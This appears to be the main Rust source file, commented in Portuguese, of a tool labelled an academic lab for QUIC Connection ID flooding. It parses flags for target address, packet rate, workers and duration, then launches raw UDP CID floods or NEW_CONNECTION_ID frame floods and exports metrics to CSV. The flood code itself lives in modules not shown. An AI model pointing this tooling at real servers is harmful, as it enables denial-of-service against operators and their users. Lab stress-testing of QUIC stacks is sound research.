//! QUIC CID Flood Lab — Ferramenta acadêmica de stress-testing
//!
//! Uso:
//!   quic-cid-flood --config config/lab.toml
//!   quic-cid-flood --target 192.168.1.100:443 --vector raw --workers 8 --duration 60
//!   quic-cid-flood --target 192.168.1.100:443 --vector both --rate 50000 --output results/exp01.csv

mod attack;
mod config;
mod metrics;
mod utils;

use std::{
    path::PathBuf,
    time::{Duration, Instant},
};

use anyhow::Result;
use clap::{Parser, ValueEnum};
use tracing::info;
use tracing_subscriber::EnvFilter;

use attack::{frame_flood::run_frame_flood, raw_flood::run_raw_flood};
use config::{AttackConfig, AttackVector, FramesFloodConfig, LabConfig, MetricsConfig, TargetConfig};
use metrics::{exporter::{export_csv, print_summary}, MetricsCollector};

// ─── CLI ─────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, ValueEnum)]
enum VectorArg {
    Raw,
    Frames,
    Both,
}

#[derive(Parser, Debug)]
#[command(
    name    = "quic-cid-flood-attack",
    about   = "QUIC CID Flooding — Ferramenta de stress-test acadêmico",
    version = "0.1.0",
)]
struct Cli {
    /// Arquivo de configuração TOML (alternativa a flags individuais)
    #[arg(long, value_name = "FILE")]
    config: Option<PathBuf>,

    /// Endereço do servidor alvo (ex: 192.168.1.100:443)
    #[arg(long, value_name = "IP:PORT")]
    target: Option<String>,

    /// Vetor de ataque a executar
    #[arg(long, default_value = "raw")]
    vector: VectorArg,

    /// Número de workers paralelos (Vetor 1)
    #[arg(long, default_value_t = 4)]
    workers: usize,

    /// Pacotes por segundo por worker (Vetor 1)
    #[arg(long, default_value_t = 10_000)]
    rate: u64,

    /// Duração do experimento em segundos
    #[arg(long, default_value_t = 30)]
    duration: u64,

    /// Comprimento do CID em bytes [1-20]
    #[arg(long, default_value_t = 20)]
    cid_len: usize,

    /// Número de conexões paralelas (Vetor 2)
    #[arg(long, default_value_t = 10)]
    connections: usize,

    /// IDs solicitados por conexão (Vetor 2)
    #[arg(long, default_value_t = 100)]
    ids_per_conn: usize,

    /// Intervalo de amostragem de métricas em ms
    #[arg(long, default_value_t = 500)]
    sample_ms: u64,

    /// Caminho do arquivo CSV de saída
    #[arg(long, default_value = "results/experiment.csv")]
    output: String,
}

// ─── Main ─────────────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() -> Result<()> {
    // Registra o CryptoProvider do rustls 0.23 (obrigatório antes de qualquer uso TLS)
    rustls::crypto::ring::default_provider()
        .install_default()
        .expect("Falha ao instalar CryptoProvider do rustls");

    // Logging configurável via env RUST_LOG (padrão: info)
    tracing_subscriber::fmt()
        .with_env_filter(
            EnvFilter::try_from_env("RUST_LOG").unwrap_or_else(|_| EnvFilter::new("info")),
        )
        .init();

    let cli = Cli::parse();

    // Constrói a configuração: arquivo TOML tem prioridade, flags sobrescrevem
    let cfg = build_config(&cli)?;

    print_banner(&cfg);

    let vector_label = match cfg.attack.vector {
        AttackVector::Raw    => "raw",
        AttackVector::Frames => "frames",
        AttackVector::Both   => "both",
    };

    let metrics = MetricsCollector::new(vector_label, cfg.attack.cid_len);

    // Inicia coleta de métricas em background
    let metrics_task = {
        let m   = metrics.clone();
        let ms  = cfg.metrics.sample_interval_ms;
        tokio::spawn(async move { m.run_sampling_loop(ms).await })
    };

    let deadline = Instant::now() + Duration::from_secs(cfg.attack.duration_secs);
    let target   = cfg.target.addr();

    info!(target = %target, duration = cfg.attack.duration_secs, "Experimento iniciado");

    // Executa vetores configurados
    match cfg.attack.vector {
        AttackVector::Raw => {
            run_raw_flood(target, cfg.attack.clone(), metrics.clone(), deadline).await?;
        }
        AttackVector::Frames => {
            run_frame_flood(
                target,
                cfg.attack.clone(),
                cfg.frames_flood.clone(),
                metrics.clone(),
                deadline,
            )
            .await?;
        }
        AttackVector::Both => {
            // Ambos os vetores em paralelo
            tokio::try_join!(
                run_raw_flood(target.clone(), cfg.attack.clone(), metrics.clone(), deadline),
                run_frame_flood(
                    target,
                    cfg.attack.clone(),
                    cfg.frames_flood.clone(),
                    metrics.clone(),
                    deadline,
                ),
            )?;
        }
    }

    // Aguarda última amostragem
    tokio::time::sleep(Duration::from_millis(cfg.metrics.sample_interval_ms * 2)).await;
    metrics_task.abort();

    // Exporta resultados
    let samples = metrics.snapshot();
    let output  = std::path::Path::new(&cfg.metrics.output_csv);
    export_csv(&samples, output)?;

    let (total_pkts, total_bytes) = metrics.totals();

    println!();
    println!("╔══════════════════════════════════════════════╗");
    println!("║           EXPERIMENTO FINALIZADO             ║");
    println!("╠══════════════════════════════════════════════╣");
    print_summary(&samples);
    println!("  CSV salvo em    : {}", cfg.metrics.output_csv);
    println!("╚══════════════════════════════════════════════╝");

    info!(total_pkts, total_bytes, csv = %cfg.metrics.output_csv, "Experimento concluído");

    Ok(())
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

fn build_config(cli: &Cli) -> Result<LabConfig> {
    // 1. Tenta carregar do arquivo TOML se fornecido
    let mut cfg = if let Some(ref path) = cli.config {
        LabConfig::load(path)?
    } else {
        LabConfig::default()
    };

    // 2. Sobrescreve com flags CLI se fornecidas
    if let Some(ref t) = cli.target {
        let parts: Vec<&str> = t.rsplitn(2, ':').collect();
        if parts.len() == 2 {
            cfg.target = TargetConfig {
                port: parts[0].parse().unwrap_or(443),
                ip:   parts[1].to_string(),
            };
        }
    }

    cfg.attack = AttackConfig {
        vector: match cli.vector {
            VectorArg::Raw    => AttackVector::Raw,
            VectorArg::Frames => AttackVector::Frames,
            VectorArg::Both   => AttackVector::Both,
        },
        duration_secs: cli.duration,
        cid_len:       cli.cid_len,
        workers:       cli.workers,
        rate_pps:      cli.rate,
    };

    cfg.frames_flood = FramesFloodConfig {
        connections:  cli.connections,
        ids_per_conn: cli.ids_per_conn,
    };

    cfg.metrics = MetricsConfig {
        sample_interval_ms: cli.sample_ms,
        output_csv:         cli.output.clone(),
    };

    Ok(cfg)
}

fn print_banner(cfg: &LabConfig) {
    let vector_str = match cfg.attack.vector {
        AttackVector::Raw    => "RAW UDP CID Flood",
        AttackVector::Frames => "NEW_CONNECTION_ID Frame Flood",
        AttackVector::Both   => "BOTH (Raw UDP + Frame Flood)",
    };

    println!();
    println!("╔══════════════════════════════════════════════╗");
    println!("║     QUIC CID Flood Lab — Academic Tool       ║");
    println!("╠══════════════════════════════════════════════╣");
    println!("║  Target   : {:<33}║", cfg.target.addr());
    println!("║  Vector   : {:<33}║", vector_str);
    println!("║  Workers  : {:<33}║", cfg.attack.workers);
    println!("║  CID Len  : {} bytes{:<26}║", cfg.attack.cid_len, "");
    println!("║  Duration : {}s{:<31}║", cfg.attack.duration_secs, "");
    println!("║  Rate/wkr : {} pps{:<28}║", cfg.attack.rate_pps, "");
    println!("╚══════════════════════════════════════════════╝");
    println!();
}
